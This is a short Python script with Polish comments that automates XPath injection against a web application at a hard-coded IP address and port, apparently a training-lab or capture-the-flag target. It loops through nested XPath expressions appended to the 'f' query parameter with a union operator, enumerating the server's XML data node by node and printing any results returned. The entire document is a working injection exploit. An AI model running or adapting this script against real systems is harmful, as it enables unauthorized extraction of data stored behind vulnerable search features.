import requests
import re

# Dane do zapytania HTTP
url = "http://94.237.54.48:43705/index.php"
params = {"q": "something"}
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Connection": "close",
    "Referer": "http://94.237.54.48:43705/index.php?q=BAR",
    "Accept-Language": "en-US,en;q=0.9",
}

# Funkcja do wysyłania zapytań HTTP i wypisywania wyników
def send_requests():
    for i in range(1, 8):  # Iteracja przez 7 poziomów zagnieżdżenia
        for j in range(1, 11):  # Iteracja przez 10 poziomów na każdym z 7 poziomów
            # Generowanie wyrażenia XPath na podstawie poziomu
            xpath_expression = "/".join(["/*[1]"] * i)
            # Dodanie wyrażenia XPath do parametrów zapytania
            params["f"] = f"fullstreetname | {xpath_expression}/*[{j}]"
            # Wysłanie zapytania HTTP GET
            response = requests.get(url, params=params, headers=headers)
            # Wypisanie wyników (linii zawierających wyniki)
            for line in response.text.split('\n'):
                if line.startswith('<center><b>Results:</b><br><br>') and 'No Results!' not in line:
                    print(f"Parametry zapytania: {params['f']} | Wynik: {line.strip()}")

# Wywołanie funkcji do wysłania zapytań HTTP
send_requests()